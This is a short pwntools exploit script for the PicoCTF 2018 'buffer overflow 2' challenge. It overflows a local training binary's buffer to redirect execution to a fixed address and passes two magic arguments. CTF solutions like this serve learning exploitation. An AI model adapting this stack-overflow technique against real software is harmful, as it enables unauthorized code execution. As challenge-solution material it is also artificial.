from pwn import *
io = process('./PicoCTF_2018_buffer_overflow_2')
padding = b'A'*(0x6c+4)
payload = padding+p32(0x080485CB)+p32(0)+p32(0xDEADBEEF)+p32(0xDEADC0DE)
io.sendlineafter(b'Please enter your string:',payload)
io.interactive()
